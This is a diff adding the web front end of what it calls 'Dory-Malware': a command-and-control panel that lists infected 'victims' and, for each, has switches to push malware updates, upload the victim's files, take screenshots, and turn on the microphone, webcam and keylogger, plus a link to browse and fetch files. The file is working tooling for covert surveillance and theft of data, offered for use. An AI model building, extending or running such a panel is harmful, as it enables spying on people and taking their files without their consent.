@@ -1,0 +1,675 @@
+{{> header}}
+<nav>
+    <h3 style="float: left;">Dory-Malware | </h3>
+    <h3 style="float: left; color: white;">Victims <i class="fas fa-users"></i></h3>
+    <a style="float: right; padding: 5px;" href="/victims/exit"><i style="font-size: 20px;" class="fas fa-power-off"></i></a>
+    <h3 style="float: right; padding-right: 20px; cursor: porinter;">Admin</h3>
+</nav>
+<div class="contenedor">
+    <div style="padding-top: 40px;"></div>
+    <div class="container-fluid" style="padding: 30px;">
+        <div class="row justify-content-center">
+            
+            {{#each victims}}
+            <div class="card" style="width: 15rem; background-color: black; margin: 20px; color: white; padding: 20px; border-radius: 20px">
+                <center>
+                    <img class="icon-victim" src="{{image}}">
+                    <h4>{{name}}</h4>
+                    <button style="width: 100%;" class="btn btn-success" id="{{id}}">View</button>
+                </center>
+            </div>
+            {{/each}}
+        </div>
+    </div>
+</div>
+<input type="hidden" id="token" value="{{token}}">
+<script>
+    {{#each victims}}
+    var {{id}} = document.getElementById("{{id}}");
+    {{id}}.addEventListener("click", {{id}} =>{
+        Swal.fire({
+            html: "<div style='overflow: hidden;'>"+
+            "<img class='icon-victim' src='{{image}}'>" + 
+            "<div class='modal-text'>"+
+                "<center>"+
+                    "<h3>{{name}}</h3>" +
+                "</center>"+
+                "<h4 style='text-aling: inherit;'>Actions</h4>" +
+                    "<label for='a'><h4>Do you want to update the malware?</h4></label>"+
+                    "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if update}}
+                        "<input type='hidden' name='update' id='update' value='{{update}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='a' value='{{update}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='update' id='update' value='{{update}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='a' value='{{update}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<label for='b'><h4>Do you want to upload the files?</h4></label>"+
+                    "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if files}}
+                        "<input type='hidden' name='file' id='files' value='{{files}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='b' value='{{files}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='file' id='files' value='{{files}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='b' value='{{files}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<label for='c'><h4>Do you want to take screenshots?</h4></label>"+
+                    "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if screenshots}}
+                        "<input type='hidden' name='screenshot' id='screenshot' value='{{screenshots}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='c' value='{{screenshots}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='screenshot' id='screenshot' value='{{screenshots}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='c' value='{{screenshots}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<label for='d'><h4>Do you want to active the microphone?</h4></label>"+
+                    "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if microphone}}
+                        "<input type='hidden' name='microphone' id='microphone' value='{{microphone}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='d' value='{{microphone}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='microphone' id='microphone' value='{{microphone}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='d' value='{{microphone}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<label for='e'><h4>Do you want to active the webcam?</h4></label>"+
+                    "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if webcam}}
+                        "<input type='hidden' name='webcam' id='webcam' value='{{webcam}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='e' value='{{webcam}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='webcam' id='webcam' value='{{webcam}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='e' value='{{webcam}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<label for='f'><h4>Do you want to active the keylogger?</h4></label>"+
+                     "<div style='padding-left: 15%' class='form-check form-switch'>"+
+                        {{#if keylogger}}
+                        "<input type='hidden' name='keylogger' id='keylogger' value='{{webcam}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='f' value='{{keylogger}}' checked>"+
+                        {{else}}
+                        "<input type='hidden' name='keylogger' id='keylogger' value='{{webcam}}'>"+
+                        "<input class='form-check-input' type='checkbox' role='switch' id='f' value='{{keylogger}}'>"+
+                        {{/if}}
+                    "</div>"+
+                    "<br>"+
+                    "<h4>Do you want to see the files or get some file?</h4>"+
+                    "<a href='/victim/{{id}}' style='width: 30%' class='btn btn-success'>Go</a>"+
+                    "<div style='height: 80px; overflow-x: none; '>"+
+                        "<div style='padding-top: 20px;'></div>"+
+                        "<div style='text-align: center;' id='alert'></div"+
+                    "</div>"+
+                "</div>"+
+            "</div>",
+            background: "rgba(0, 0, 0, .9)",
+            showConfirmButton: false
+        })
+
+        var a = document.getElementById("a");
+        var b = document.getElementById("b");
+        var c = document.getElementById("c");
+        var d = document.getElementById("d");
+        var e = document.getElementById("e");
+        var f = document.getElementById("f");
+
+        var update = document.getElementById("update");
+        var files = document.getElementById("files");
+        var screenshot = document.getElementById("screenshot");
+        var microphone = document.getElementById("microphone");
+        var webcam = document.getElementById("webcam");
+        var keylogger = document.getElementById("keylogger");
+
+        a.addEventListener("click", () =>{
+
+            if(update.value == "false"){
+                update.value = true;
+            }else{
+                update.value = false;
+            }
+    
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    update: update.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Update failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "Update change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else{
+
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Update failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                        
+                    }
+
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Update failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+        })
+
+        b.addEventListener("click", () =>{
+
+            if(files.value == "false"){
+                files.value = true;
+            }else{
+                files.value = false;
+            }
+
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    files: files.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Files failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "FIles change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }
+
+                    
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Files failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+        })
+
+        c.addEventListener("click", () =>{
+
+            if(screenshot.value == "false"){
+                screenshot.value = true;
+            }else{
+                screenshot.value = false;
+            }
+
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    screenshots: screenshot.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Screenshots failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "Screenshots change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }
+
+                    
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Screenshots failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+
+        })
+
+        d.addEventListener("click", () =>{
+
+            if(microphone.value == "false"){
+                microphone.value = true;
+            }else{
+                microphone.value = false;
+            }
+
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    microphone: microphone.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Microphone failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "Microphone change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }
+
+                    
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Microphone failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+
+        })
+
+        e.addEventListener("click", () =>{
+
+            if(webcam.value == "false"){
+                webcam.value = true;
+                
+            }else{
+                webcam.value = false;
+            }
+
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    webcam: webcam.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Webcam failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "Webcam change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }
+
+                    
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Webcam failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+
+        })
+
+        f.addEventListener("click", () =>{
+
+            if(keylogger.value == "false"){
+                keylogger.value = true;
+            }else{
+                keylogger.value = false;
+            }
+
+            $.ajax({
+                url: "/victim/{{id}}",
+                method: "PUT",
+
+                data: {
+                    keylogger: keylogger.value,
+                    token: document.getElementById("token").value
+                },
+
+                success: function(response){
+                    if(response == 0){
+                        window.location.href = "/login";
+                    }else if(response == 1){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-danger")
+                        document.getElementById("alert").innerText = "Keylogger failed"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-danger")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }else if(response == 2){
+                        document.getElementById("alert").classList.add("animate__animated")
+                        document.getElementById("alert").classList.add("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("alert")
+                        document.getElementById("alert").classList.add("alert-success")
+                        document.getElementById("alert").innerText = "Keylogger change"
+
+                        setTimeout (function fadeOut(){
+                            document.getElementById("alert").classList.remove("animate__fadeInDown")
+                            document.getElementById("alert").classList.add("animate__fadeOutDown")
+                        }, 2000)
+
+                        setTimeout (function remove(){
+                            document.getElementById("alert").innerText = ""
+                            document.getElementById("alert").classList.remove("alert")
+                            document.getElementById("alert").classList.remove("alert-success")
+                            document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                            document.getElementById("alert").classList.remove("animate__animated")
+                        }, 2800)
+                    }
+
+                    
+                },
+                error: function(err){
+                    document.getElementById("alert").classList.add("animate__animated")
+                    document.getElementById("alert").classList.add("animate__fadeInDown")
+                    document.getElementById("alert").classList.add("alert")
+                    document.getElementById("alert").classList.add("alert-danger")
+                    document.getElementById("alert").innerText = "Keylogger failed"
+
+                    setTimeout (function fadeOut(){
+                        document.getElementById("alert").classList.remove("animate__fadeInDown")
+                        document.getElementById("alert").classList.add("animate__fadeOutDown")
+                    }, 2000)
+
+                    setTimeout (function remove(){
+                        document.getElementById("alert").innerText = ""
+                        document.getElementById("alert").classList.remove("alert")
+                        document.getElementById("alert").classList.remove("alert-danger")
+                        document.getElementById("alert").classList.remove("animate__fadeOutDown")
+                        document.getElementById("alert").classList.remove("animate__animated")
+                    }, 2800)
+                }
+            })
+
+        })
+
+
+        
+    })
+
+    {{/each}}
+
+    function modal_close(){
+        swal.close()
+    }
+
+</script>
+
+
+{{> footer}}
